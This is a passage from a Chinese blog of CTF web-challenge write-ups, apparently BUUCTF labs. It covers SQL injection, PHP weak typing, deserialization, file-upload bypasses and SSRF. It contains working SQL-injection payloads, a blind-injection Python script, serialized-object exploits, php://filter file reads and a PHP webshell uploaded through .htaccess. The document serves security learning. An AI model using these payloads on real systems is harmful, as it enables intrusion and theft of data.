\n\n看见疑似flag的f1agg\n我们用同样的方法拼接命令\n&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#103;?%20num=1;var_dump(scandir(chr(47).chr(102).chr(108).chr(97).chr(103).chr(103)))//犯了个天大的错误1我竟然看成l了?   %20num=1;var_dump(scandir(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))\n\n发现目录下没东西，返回false(这是因为这是一个文件的原因吗)，我们可以使用file_get_contents查看f1agg文件的内容\n? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))\n\n成功拿到flag\n12.[极客大挑战 2019]BuyFlag这次比较好找，直接查看源码发现\n&lt;!--\t~~~post money and password~~~if (isset($_POST[&#x27;password&#x27;])) &#123;\t$password = $_POST[&#x27;password&#x27;];\tif (is_numeric($password)) &#123;\t\techo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;\t&#125;elseif ($password == 404) &#123;\t\techo &quot;Password Right!&lt;/br&gt;&quot;;\t&#125;&#125;--&gt;\n\n直接抓包传POST，我们先利用php弱类型比较404a被转换为数字404的特性，传password&#x3D;404a。得到Only Cuit’s students can buy the FLAG\n我们发现cookie中user&#x3D;0，我们改为user&#x3D;1，成功绕过拿到下一条语句Pay for the flag!!!hacker!!!\n我们再用POST传参money&#x3D;1000000000，拿到Nember lenth is too long，也就是我们的money太长了，需要简短。\n缩短money有两种方法，一是利用科学计数法使用1e9，即1乘10的9次方。二是利用数组money[]&#x3D;1000000000，php把数字拆开，一个字符一个下标\n\n\n如果在 32 位系统中，由于 1000000000 超出了 32 位整数的范围，PHP 可能会将其存储为字符串类型。但在64位系统下，就不会超出范围。这个money的验证可能不是通过php来完成，因为在php里面数组和数字和字符串之间弱类型验证不会进行转换。但数组之间可以进行比较。\n13.[极客大挑战 2019]HardSQL先说明一下，这和以前的注入不一样，这真的难。通过GET请求传username和password\n我首先试了一下各种方法，发现了一些绕过关键词\nunion，=，%0a，%0c \\n，\\t，by，substr //空格都被过滤了，\n\n由于空格全被过滤掉了，union也不行，我们只能去尝试报错注入。没空格的报错注入也好难\nusername=admin&#x27;or(updatexml(1,concat(&#x27;^&#x27;,(select(database())),&#x27;^&#x27;),1))%23不知道为什么，#必须写成%23，以前都没遇到这种情况拿到 geekadmin&#x27;or(updatexml(1,concat(&#x27;^&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),&#x27;^&#x27;),1))%23#这里=被过滤掉了，我们只能使用where(table_schema)like(&#x27;geek&#x27;)#拿到表名 H4rDsq1admin&#x27;or(updatexml(1,concat(&#x27;^&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),&#x27;^&#x27;),1))%23#和上一句一样，拿到列名 id,username,passwordadmin&#x27;or(updatexml(1,concat(&#x27;^&#x27;,(select(group_concat(password))from(H4rDsq1)),&#x27;^&#x27;),1))%23#拿到flag&#123;5156b2db-256f-4595 发现limit没空格不能用，substr被过滤掉了\n\n之前我们都没遇到这种情况，看大佬的题解知道了left()和right()\nRIGHT() 函数是一个字符串函数，其主要作用是从给定字符串的右侧开始提取指定数量的字符。以下为你详细介绍该函数的语法\nleft()则是从字符串左边开始取\nRIGHT(str, len)str：必填参数，代表要进行处理的原始字符串。它可以是一个具体的字符串常量，也可以是表中某一列的字符串值。len：必填参数，是一个非负整数，用于指定从字符串右侧开始提取的字符数量。\n\n于是通过right()从右边把剩下的flag读出来\nadmin&#x27;or(updatexml(1,concat(&#x27;^&#x27;,(select(group_concat(right(password,25)))from(H4rDsq1)),&#x27;^&#x27;),1))%23拿到 f-4595-a491-e93e1867970c&#125;\n\n14.[强网杯 2019]随便注这是一个sql注入的题目，我们先随便试下。万能密码可以用，但是没有flag。只有两个字段。当我想联合注入时，发现被过滤掉了，出现一句话\nreturn preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);\n\n过滤掉了一些关键词，由于select和where的过滤，先不考虑报错和联合，试一下堆叠注入\n&#x27;;show databases;\n\n发现可以执行，直接报表和字段\n&#x27;;show tables;\n\n拿到\n//tablearray(1) &#123;  [0]=&gt;  string(16) &quot;1919810931114514&quot;&#125;array(1) &#123;  [0]=&gt;  string(5) &quot;words&quot;&#125;\n\n接着去查字段\n&#x27;;show columns from words;&#x27;;show columns from `1919810931114514`;\n\n在查字段时发现表1919810931114514\narray(6) &#123;  [0]=&gt;  string(4) &quot;flag&quot;  [1]=&gt;  string(12) &quot;varchar(100)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;&#125;\n\n发现疑似flag的字段，但万能密码看不到，所以我们应该是words表\n&#x27; or 1=1 from `1919810931114514` ##这个是我当时很脑残的一个想法，我忘了from要在where前面\n\n后面就全是大佬的操作了，看大佬有好几种方法\n方法1 改表名\n由于查询的是words表，我们把表名改了就行了，更改表名使用的是rename()，但是光改名不够，由于字段不一样，我们需要给flag表也加上id字段用alert()\nrename table words to word1; rename table `1919810931114514` to words;alter table words add column id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);##我们先给名字改过来，然后再加上id字段，由于select id,data 但flag表里面没有data，我们还需要把flag改为data\n\n方法2 使用预处理语句\n由于select被过滤掉了，没办法直接查询flag。但是我们可以通过预处理语句prepare去绕过\n先将select * from `1919810931114514&#96;进行16进制编码73656c656374202a2066726f6d20603139313938313039333131313435313460\n然后再执行预处理\nprepare sqll from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;execute sqll;#\n\n方法3 handler代替select\n在 MySQL 中，HANDLER 语句是一种用于直接访问表的底层存储引擎接口的机制。它提供了一种在不使用标准 SQL 语句（如 SELECT、INSERT、UPDATE 和 DELETE）的情况下，对表进行行级操作的方法。这种方法通常比标准 SQL 语句更快，因为它绕过了一些 SQL 解析和优化步骤，直接与存储引擎交互。\n-- 我们需要先打开表HANDLER tbl_name OPEN [AS alias];-- 读取下一行HANDLER tbl_name READ NEXT;-- 读取第一行HANDLER tbl_name READ FIRST;-- 读取指定索引的第一行HANDLER tbl_name READ index_name FIRST;-- 读取指定索引的下一行，条件是索引值大于或等于指定值HANDLER tbl_name READ index_name NEXT WHERE key_part1 = value1 [AND key_part2 = value2 ...];\n\n直接用handler查\nhandler `1919810931114514` open;handler `1919810931114514` read next;#\n\n\n\n15.[极客大挑战 2019]PHP界面什么都没有，直接试www.zip。成功下载到，但这只有参考价值，不能作为网页源码。\n//index.php php部分include &#x27;class.php&#x27;;    $select = $_GET[&#x27;select&#x27;];    $res=unserialize(@$select);    ?&gt;\n\n&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123;    private $username = &#x27;nonono&#x27;;    private $password = &#x27;yesyes&#x27;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function __wakeup()&#123;        $this-&gt;username = &#x27;guest&#x27;;    &#125;    function __destruct()&#123;        if ($this-&gt;password != 100) &#123;            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        &#125;        if ($this-&gt;username === &#x27;admin&#x27;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;            die();                    &#125;    &#125;&#125;?&gt;//class.php 看起来挺多，能用的少\n\n__construct()和__wakeup()都进行了复制但是wakeup需要进行反序列化时才能触发，我们利用不了还需要绕过\n之前学php反序列化的时候，存在一种情况类对属性的类型不敏感，即我们遇到private和protect的改为public就能不用包含特殊字符了。\n但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有\\x00*\\x00也依然会输出abc\n&lt;?phpclass test&#123;    protected $a;    public function __construct()&#123;        $this-&gt;a = &#x27;abc&#x27;;    &#125;    public function  __destruct()&#123;        echo $this-&gt;a;    &#125;&#125;unserialize(&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;);\n\n这样在绕过wakeup()的时候就会简单一点。但是这题试过了用不了，wakeup绕过了，但变量未实现覆盖。\n我们只能自己手动加上去\n&lt;?phpclass Name&#123;    private $username = &#x27;nonono&#x27;;    private $password = &#x27;yesyes&#x27;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;&#125;$a=new Name(&#x27;admin&#x27;,100);echo serialize($a);//O:4:&quot;Name&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admim&quot;;s:8:&quot;password&quot;;i:100;&#125;//O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admim&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; 改变量数量绕过wakeup\n\n\n\n16.[ZJCTF 2019]NiZhuanSiWei这个题目的名字是，逆转思维，但实际上每一题都是如此\n &lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        echo &quot;Not now!&quot;;        exit();     &#125;else&#123;        include($file);  //useless.php        $password = unserialize($password);        echo $password;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt; \n\n在这个题目之前我们需要再次去了解以下data伪协议，之前只是在文件包含中用到了，但是不知道data伪协议原来的作用\ndata 伪协议（Data URI Scheme） 是一种允许在 URL 中直接嵌入数据（如文本、图片、音频等）的特殊协议，无需依赖外部文件。其核心作用是简化资源嵌入、减少网络请求，常见于前端开发和轻量化场景\n也就是说，我们可以通过data伪协议在url中以文件形式包含一些内容，包括图片，文本，音频\n//语法data:[&lt;MIME类型&gt;][;base64],&lt;数据内容&gt;\n\n示例\n\n纯文本：data:text/plain,Hello World\nHTML 片段：data:text/html,&lt;p&gt;Hello&lt;/p&gt;\n图片（需 base64 编码）：data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD...\n\n于是我们回到题目中，有这么一句话\nfile_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;\n\n我们不可能随便造个文件出来，于是就用data伪协议把语句用文本包起来\n?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/convert.base64-encode/resource=useless.php访问useless.php，拿到其base64编码，进行解码\n\n拿到useless.php\n&lt;?php  class Flag&#123;  //flag.php      public $file;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        &#125;      &#125;  &#125;  ?&gt;  \n\n这个反序列化比较简答，只需要把file&#x3D;flag.php，在echo的时候就会输出flag.php\n&lt;?phpclass Flag&#123;  //flag.php    public $file=&#x27;flag.php&#x27;;&#125;$a=new Flag();echo serialize($a);\n\npayload:\n?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;\n\n\n\n17.[MRCTF2020]Ez_bypass\n\n这个题目查看页面源代码长上面这样\ninclude &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;    $id=$_GET[&#x27;id&#x27;];    $gg=$_GET[&#x27;gg&#x27;];    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;        echo &#x27;You got the first step&#x27;;        if(isset($_POST[&#x27;passwd&#x27;])) &#123;            $passwd=$_POST[&#x27;passwd&#x27;];            if (!is_numeric($passwd))            &#123;                 if($passwd==1234567)                 &#123;                     echo &#x27;Good Job!&#x27;;                     highlight_file(&#x27;flag.php&#x27;);                     die(&#x27;By Retr_0&#x27;);                 &#125;                 else                 &#123;                     echo &quot;can you think twice??&quot;;                 &#125;            &#125;            else&#123;                echo &#x27;You can not get it !&#x27;;            &#125;        &#125;        else&#123;            die(&#x27;only one way to get the flag&#x27;);        &#125;&#125;    else &#123;        echo &quot;You are not a real hacker!&quot;;    &#125;&#125;else&#123;    die(&#x27;Please input first&#x27;);&#125;&#125;Please input first\n\n这个没什么难度，就是一个简单的php特性的题目直接绕过md5和is_numeric即可，上payload:\nGET:?id[]=1&amp;gg[]=2POST:passwd=1234567a\n\n18.[GXYCTF2019]BabyUpload看名字这就是一个文件上传的题目，题目是给了我们源码的但我网速慢，没下载下来，作为一个普通题目去写\n首先是抓包然后一堆测试，发现后缀名过滤掉了ph，content-type只允许image&#x2F;jpeg。最重要的是，内容过滤掉了&lt;?，也就是无法上传正常的一句话木马了\n一开始我想上传.user.ini文件，使用日志包含，但网速慢无法访问不说，还不能确定upload文件夹下面有.php文件，下次优先不使用这个方法\n正解是我们先上传.htaccess文件，在上传图片马\n//.htaccessAddType application/x-httpd-php .jpg .txt .png//让这些后缀名作为php文件执行//door.jpg&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;pass&#x27;]); &lt;/script&gt;//用js写的一句话木马，绕过了&lt;?\n\n上传后用蚁剑连接就行了，下次优先使用这个方法。\n最后看下源码\n&lt;?phpsession_start();echo &quot;&lt;meta http-equiv=\\&quot;Content-Type\\&quot; content=\\&quot;text/html; charset=utf-8\\&quot; /&gt; &lt;title&gt;Upload&lt;/title&gt;&lt;form action=\\&quot;\\&quot; method=\\&quot;post\\&quot; enctype=\\&quot;multipart/form-data\\&quot;&gt;上传文件&lt;input type=\\&quot;file\\&quot; name=\\&quot;uploaded\\&quot; /&gt;&lt;input type=\\&quot;submit\\&quot; name=\\&quot;submit\\&quot; value=\\&quot;上传\\&quot; /&gt;&lt;/form&gt;&quot;;error_reporting(0);if(!isset($_SESSION[&#x27;user&#x27;]))&#123;    $_SESSION[&#x27;user&#x27;] = md5((string)time() . (string)rand(100, 1000));&#125;if(isset($_FILES[&#x27;uploaded&#x27;])) &#123;    $target_path  = getcwd() . &quot;/upload/&quot; . md5($_SESSION[&#x27;user&#x27;]);    $t_path = $target_path . &quot;/&quot; . basename($_FILES[&#x27;uploaded&#x27;][&#x27;name&#x27;]);    $uploaded_name = $_FILES[&#x27;uploaded&#x27;][&#x27;name&#x27;];    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,&#x27;.&#x27;) + 1);    $uploaded_size = $_FILES[&#x27;uploaded&#x27;][&#x27;size&#x27;];    $uploaded_tmp  = $_FILES[&#x27;uploaded&#x27;][&#x27;tmp_name&#x27;];     if(preg_match(&quot;/ph/i&quot;, strtolower($uploaded_ext)))&#123;        die(&quot;后缀名不能有ph！&quot;);    &#125;    else&#123;        if ((($_FILES[&quot;uploaded&quot;][&quot;type&quot;] == &quot;            &quot;) || ($_FILES[&quot;uploaded&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;) || ($_FILES[&quot;uploaded&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)) &amp;&amp; ($_FILES[&quot;uploaded&quot;][&quot;size&quot;] &lt; 2048))&#123;            $content = file_get_contents($uploaded_tmp);            if(preg_match(&quot;/\\&lt;\\?/i&quot;, $content))&#123;                die(&quot;诶，别蒙我啊，这标志明显还是php啊&quot;);            &#125;            else&#123;                mkdir(iconv(&quot;UTF-8&quot;, &quot;GBK&quot;, $target_path), 0777, true);                move_uploaded_file($uploaded_tmp, $t_path);                echo &quot;&#123;$t_path&#125; succesfully uploaded!&quot;;            &#125;        &#125;        else&#123;            die(&quot;上传类型也太露骨了吧！&quot;);        &#125;    &#125;&#125;?&gt;\n\n\n\n19.[SUCTF 2019]CheckIn这个题目也是文件上传，但有点打破了固定思维，也算是学到了\n过滤非常简单，文件名后缀过滤了ph，我们无法上传php文件。还进行了文件头检测文件开头加上GIF89a即可。还过滤了内容&lt;?，这个用js写一句话木马即可\n根据上一题，我优先使用.htaccess文件，但这次出了问题，无论怎么搞.htaccess文件都无法生效，搞了半天才知道\n\n\n.htaccess文件是阿帕奇的配置文件，但这题的服务器不是阿帕奇 \n没办法，只能重新使用.user.ini\n\n\n在回显目录下存在inex.php文件，只要上传一句话木马即可\n20.[CISCN2019 华北赛区 Day2 Web1]Hack World这是一道sql注入的题目，但是是布尔盲注，而且还有过滤，并且过滤方式比较奇怪\n鉴于1,2都有不同的回显认为这是一个id&#x3D;数字，类型的sql查询，我们使用ascii()判断一下\n\n\n果然ascii(a)&gt;50被认定为true了，我们使用二分法盲注即可\nimport requestsurl=&#x27;http://e4ef0f63-3787-4856-a7fc-d8f8ea7c8125.node5.buuoj.cn:81/index.php&#x27;flag=&#x27;&#x27;for i in range(1,50):    low = 32    high = 127    while low&lt;high :        mid = (low + high) // 2        data=&#123;            &#x27;id&#x27;:f&quot;if(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&quot;        &#125;        r=requests.post(url,data=data)        #print(r.text)        if &#x27;girlfriend&#x27; in r.text:            #print(&#x27;success&#x27;)            low=mid+1        else :            high=mid    if low!=32:        flag+=chr(low)        print(flag)    else :     break\n\n需要注意的是过滤了空格和#，但是我们这里没使用闭合，所以不需要注释\n21.[GXYCTF2019]BabySQli这题没看源代码凭我根本没办法做出来，我们还是先老实的把源码下过来吧\n&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;Do you know who am I?&lt;/title&gt;&lt;?phprequire &quot;config.php&quot;;require &quot;flag.php&quot;;// 去除转义if (get_magic_quotes_gpc()) &#123;\tfunction stripslashes_deep($value)\t&#123;\t\t$value = is_array($value) ?\t\tarray_map(&#x27;stripslashes_deep&#x27;, $value) :\t\tstripslashes($value);\t\treturn $value;\t&#125;\t$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);\t$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);\t$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);\t$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);&#125;mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);$name = $_POST[&#x27;name&#x27;];$password = $_POST[&#x27;pw&#x27;];$t_pw = md5($password);$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;// echo $sql;$result = mysqli_query($con, $sql);if(preg_match(&quot;/\\(|\\)|\\=|or/&quot;, $name))&#123;\tdie(&quot;do not hack me!&quot;);&#125;else&#123;\tif (!$result) &#123;\t\tprintf(&quot;Error: %s\\n&quot;, mysqli_error($con));\t\texit();\t&#125;\telse&#123;\t\t// echo &#x27;&lt;pre&gt;&#x27;;\t\t$arr = mysqli_fetch_row($result);\t\t// print_r($arr);\t\tif($arr[1] == &quot;admin&quot;)&#123;\t\t\tif(md5($password) == $arr[2])&#123;\t\t\t\techo $flag;\t\t\t&#125;\t\t\telse&#123;\t\t\t\tdie(&quot;wrong pass!&quot;);\t\t\t&#125;\t\t&#125;\t\telse&#123;\t\t\tdie(&quot;wrong user!&quot;);\t\t&#125;\t&#125;&#125;?&gt;\n\n我们可以从源码拿到sql语句也可以自己推断也可以到secret.php页面拿到编码先Base32然后再Base64解码，拿到sql语句\nselect  * from user where username = $name#过滤掉了/\\(|\\)|\\=|or/ 从过滤掉括号开始就和普通的sql注入没多大关系了，更像是php代码审计\n\n他们把sql查询结果放入数组中\n$arr = mysqli_fetch_row($result);\t\t// print_r($arr);\t\tif($arr[1] == &quot;admin&quot;)&#123;\t\t\tif(md5($password) == $arr[2])&#123;\t\t\t\techo $flag;\t\t\t&#125;\t\t\telse&#123;\t\t\t\tdie(&quot;wrong pass!&quot;);\t\t\t&#125;\t\t&#125;\t\telse&#123;\t\t\tdie(&quot;wrong user!&quot;);\t\t&#125;\t&#125;\n\n对传入的password进行md5编码，然后还需要等于查询出来的第二个数据，这已经和sql注入没半毛钱关系了，我们需要做的就是联合查询然后第二个字段填我们传递的password的md5编码。\npayload:\nname=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;202cb962ac59075b964b07152d234b70&#x27; #&amp;pw=123\n\n\n\n22.[网鼎杯 2018]Fakebook这个题目有点小难，结合了js，sql注入，SSRF，以及反序列化的内容，这么综合的吗\n题目开始是一个注册和登录界面，一开始我还以为是要我去爆破出账号和密码，但爆破的题目实在太少了。\n我们先尝试随便注册一个账号然后登录进去看见这个界面\n\n\n在注册界面的所有操作由js完成，当我们禁用js所有操作都不存在了，所以排除在登录界面直接存在sql注入的情况。\n我们注意到url中传递了一个?no&#x3D;1的参数，我们尝试更改为其他数字，改了之后果然无法正常显示信息，这里存在sql注入，推测查询语句为\nselect *from users where no=$no \n\n我们直接判断列数为4，然后尝试联合注入，发现union select 被过滤掉了，但是很简单绕过union&#x2F;**&#x2F;select或union    select都可以。于是直接开始联合注入\n还有就是下面那个blog是对baidu.com进行了访问，这里大概率存在SSRF漏洞\n?no=2 union  select 1,2,3,4 ##发现只有2的位置存在回显，1，3，4不知道为什么报错。就先使用2?no=2 union  select 1,database(),3,4 ##fakebook?no=2 union  select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;fakebook&#x27;##users?no=2 union  select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=&#x27;fakebook&#x27;and table_name=&#x27;users&#x27;##no,username,passwd,data#这里面有一个未知的字段data，我们先去看看?no union  select 1,group_concat(data),3,4 from users #\n\n\n\n发现这是一个被序列化的对象，结合旁边的报错推测出这里回显的数据是从这个data字段中反序列化的结果中拿出来的\n需要注意的是每次做题都需要去抓包，看下robots.txt，www.zip，等文件看下，或者拿dirsearch扫一下，这次我们在robots.txt里面发现user.php.bak，访问拿到源码\n&lt;?phpclass UserInfo&#123;    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog)    &#123;        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    &#125;    function get($url)    &#123;        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output = curl_exec($ch);        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode == 404) &#123;            return 404;        &#125;        curl_close($ch);        return $output;    &#125;    public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;    public function isValidBlog ()    &#123;        $blog = $this-&gt;blog;        return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog);    &#125;&#125;\n\n这里给我们看了他的类，让我们可以凭借这个类实现序列化\n我们根据这个类的函数和之前注册时的限制可以得知限制来源于正则匹配必须是一个正常的http:&#x2F;&#x2F;协议，但是由于用户信息是通过反序列化对象拿到的，由于之前blog那里存在SSRF漏洞，我们可以file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php拿到flag\n思路有了，直接开始序列化\n&lt;?phpclass UserInfo&#123;public $name = &quot;1&quot;;public $age = 0;public $blog = &quot;file:///var/www/html/flag.php&quot;;&#125;echo serialize(new UserInfo());//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;\n\n我们继续使用联合注入\n?no=0 union  select 1,0,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27; #\n\n\n\n我们成功把file协议写入，访问结果我们查看页面源代码拿到base64编码去解码就拿到flag了\n这题我们通过sql联合注入实现对注册界面blog的正则匹配的绕过，实现SSRF漏洞\n23.[BSidesCF 2020]Had a bad day这个题目也是先在文件里面给了源码，但是我们先不看，直接看题\n界面只有两个按钮，一个是woofers，一个是meowers。我们点击页面会显示两种不同动物的图片，会在url里面出现个category&#x3D;woofers，当我们参数时会出现报错\n\n\n我们通过报错得到这个参数传到了include()函数里面，我们尝试php伪协议访问index.php\n\n\n发现出错是因为后面多加了个.php，我们输入\nphp://filter/convert.base64-encode/resource=index\n\n拿到base64进行解码\n&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;description&quot; content=&quot;Images that spark joy&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;&gt;    &lt;title&gt;Had a bad day?&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/material.min.css&quot;&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div class=&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;      &lt;header class=&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;        &lt;div class=&quot;mdl-layout__header-row&quot;&gt;          &lt;span class=&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;/span&gt;          &lt;div class=&quot;mdl-layout-spacer&quot;&gt;&lt;/div&gt;        &lt;div&gt;      &lt;/header&gt;      &lt;div class=&quot;page-ribbon&quot;&gt;&lt;/div&gt;      &lt;main class=&quot;page-main mdl-layout__content&quot;&gt;        &lt;div class=&quot;page-container mdl-grid&quot;&gt;          &lt;div class=&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;/div&gt;          &lt;div class=&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;            &lt;div class=&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;            &lt;/div&gt;            &lt;h3&gt;Cheer up!&lt;/h3&gt;              &lt;p&gt;                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!              &lt;/p&gt;              &lt;div class=&quot;page-include&quot;&gt;              &lt;?php\t\t\t\t$file = $_GET[&#x27;category&#x27;];\t\t\t\tif(isset($file))\t\t\t\t&#123;\t\t\t\t\tif( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;\t\t\t\t\t\tinclude ($file . &#x27;.php&#x27;);\t\t\t\t\t&#125;\t\t\t\t\telse&#123;\t\t\t\t\t\techo &quot;Sorry, we currently only support woofers and meowers.&quot;;\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t\t?&gt;\t\t\t&lt;/div&gt;          &lt;form action=&quot;index.php&quot; method=&quot;get&quot; id=&quot;choice&quot;&gt;              &lt;center&gt;&lt;button onclick=&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot; name=&quot;category&quot; value=&quot;woofers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;              &lt;button onclick=&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot; name=&quot;category&quot; value=&quot;meowers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;          &lt;/form&gt;          &lt;/div&gt;        &lt;/div&gt;      &lt;/main&gt;    &lt;/div&gt;    &lt;script src=&quot;js/material.min.js&quot;&gt;&lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;\n\n把里面的php部分拿出来即可\n&lt;?php$file = $_GET[&#x27;category&#x27;];if(isset($file))&#123;   if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;      include ($file . &#x27;.php&#x27;);    &#125;   else&#123;   echo &quot;Sorry, we currently only support woofers and meowers.&quot;;        &#125;&#125;    